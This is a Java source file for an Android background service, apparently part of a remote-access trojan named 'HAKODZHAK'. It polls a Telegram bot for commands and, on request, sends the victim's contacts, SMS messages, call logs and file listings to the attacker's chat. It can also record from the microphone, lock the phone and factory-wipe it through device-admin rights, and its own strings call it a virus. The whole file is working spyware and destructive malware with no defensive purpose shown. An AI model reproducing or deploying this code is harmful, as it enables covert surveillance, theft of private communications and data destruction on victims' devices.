package com.hakodzhak.god;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.app.WallpaperManager;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MyService extends Service {
    String botToken, chatId;
    boolean isFlashOn = false;
    MediaRecorder recorder;

    @Override
    public void onCreate() {
        super.onCreate();
        botToken = getSharedPreferences("config", MODE_PRIVATE).getString("botToken", "");
        chatId = getSharedPreferences("config", MODE_PRIVATE).getString("chatId", "");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sendMsg("👑 HAKODZHAK ULTIMATE متصل.");
        new Thread(() -> {
            while (true) {
                checkCommands();
                try { Thread.sleep(3000); } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }

    void sendMsg(String text) {
        try {
            String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
            con.getInputStream();
        } catch (Exception e) {}
    }

    void checkCommands() {
        try {
            String url = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=0";
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) response.append(inputLine);
            in.close();
            String res = response.toString();

            if (res.contains("/contacts")) getContacts();
            if (res.contains("/sms")) getSMS();
            if (res.contains("/calls")) getCalls();
            if (res.contains("/flash")) toggleFlash();
            if (res.contains("/mute")) mutePhone();
            if (res.contains("/lock")) lockPhone();
            if (res.contains("/format")) formatPhone();
            if (res.contains("/wallpaper")) changeWallpaper();
            if (res.contains("/open_app ")) openApp(res);
            if (res.contains("/record_audio")) recordAudio();
            if (res.contains("/files")) listFiles();
            if (res.contains("/kill")) killVirus();
        } catch (Exception e) {}
    }

    void getContacts() {
        StringBuilder sb = new StringBuilder("📇 جهات الاتصال:\n");
        Cursor cur = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cur != null && cur.getCount() > 0) {
            while (cur.moveToNext()) {
                sb.append("- ").append(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))).append("\n");
            }
            cur.close();
        }
        sendMsg(sb.toString());
    }

    void getSMS() {
        StringBuilder sb = new StringBuilder("💬 الرسائل:\n");
        Cursor cur = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cur != null && cur.getCount() > 0) {
            while (cur.moveToNext()) {
                sb.append(cur.getString(cur.getColumnIndex(Telephony.Sms.BODY))).append("\n---\n");
            }
            cur.close();
        }
        sendMsg(sb.toString());
    }

    void getCalls() {
        StringBuilder sb = new StringBuilder("📞 المكالمات:\n");
        Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cur != null && cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String number = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                String type = cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE));
                sb.append("- ").append(number).append(" | نوع: ").append(type).append("\n");
            }
            cur.close();
        }
        sendMsg(sb.toString());
    }

    void toggleFlash() {
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = cm.getCameraIdList()[0];
            cm.setTorchMode(cameraId, !isFlashOn);
            isFlashOn = !isFlashOn;
            sendMsg("🔦 حالة الفلاش: " + (isFlashOn ? "مفعل" : "مطفأ"));
        } catch (Exception e) { sendMsg("❌ فشل الفلاش."); }
    }

    void mutePhone() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            am.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);
            am.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
            am.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
            sendMsg("🔇 تم كتم الصوت.");
        } catch (Exception e) { sendMsg("❌ فشل الكتم."); }
    }

    void lockPhone() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdmin.class);
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow();
                sendMsg("🔒 تم قفل الهاتف.");
            } else { sendMsg("❌ لا يملك صلاحيات."); }
        } catch (Exception e) {}
    }

    void formatPhone() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdmin.class);
            if (dpm.isAdminActive(admin)) { dpm.wipeData(0); }
            else { sendMsg("❌ لا يملك صلاحيات الفرمتة."); }
        } catch (Exception e) {}
    }

    void changeWallpaper() {
        try {
            WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
            wm.setBitmap(BitmapFactory.decodeResource(getResources(), android.R.drawable.ic_menu_gallery));
            sendMsg("🖼️ تم تغيير الخلفية.");
        } catch (Exception e) { sendMsg("❌ فشل تغيير الخلفية."); }
    }

    void openApp(String command) {
        if (command.contains("/open_app ")) {
            String packageName = command.split("/open_app ")[1].trim();
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                sendMsg("📱 جاري فتح: " + packageName);
            } else { sendMsg("❌ التطبيق غير مثبت."); }
        }
    }

    void recordAudio() {
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            File audioFile = new File(getExternalFilesDir(null), "audio.3gp");
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            sendMsg("🎙️ جاري تسجيل الصوت لمدة 10 ثواني...");
            Thread.sleep(10000);
            recorder.stop();
            recorder.release();
            sendMsg("🎙️ تم تسجيل الصوت (يحتاج كود لرفعه).");
        } catch (Exception e) { sendMsg("❌ فشل تسجيل الصوت: " + e.getMessage()); }
    }

    void listFiles() {
        StringBuilder sb = new StringBuilder("📂 ملفات الذاكرة:\n");
        File dir = new File("/sdcard/");
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                sb.append(file.getName()).append("\n");
            }
        }
        sendMsg(sb.toString());
    }

    void killVirus() {
        sendMsg("💀 جاري حذف الفيروس...");
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, MyDeviceAdmin.class);
            if (dpm.isAdminActive(admin)) { dpm.removeActiveAdmin(admin); }
            stopSelf();
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
